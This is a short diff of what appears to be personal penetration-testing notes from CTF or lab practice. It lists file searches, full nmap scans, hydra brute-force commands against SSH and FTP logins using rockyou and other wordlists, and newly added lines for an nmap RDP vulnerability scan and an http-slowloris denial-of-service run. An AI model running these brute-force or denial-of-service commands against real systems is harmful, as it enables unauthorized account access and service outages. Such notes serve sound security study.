@@ -6,8 +6,11 @@
 - find / -type f -regex '.*skat\.txt$' 2> /dev/null                       
 - nmap -T4 -A -p- TARGET -oN nmap.txt
 - find / -name findme.txt 2> test.txt
-- hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.116.4 ssh
+- hydra -l mark -P /usr/share/wordlists/rockyou.txt IP_Address ssh
 - Hydra -l admin -x 4:4:MLVICDX -vV sshydra.com  ssh
+- nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p PORT -T4 IP_Address
+- nmap --script http-slowloris --max-parallelism 400  IP_Address
+
 
 hydra -l admin -P /usr/share/john/password.lst -vV ftplogin.com ftp
 
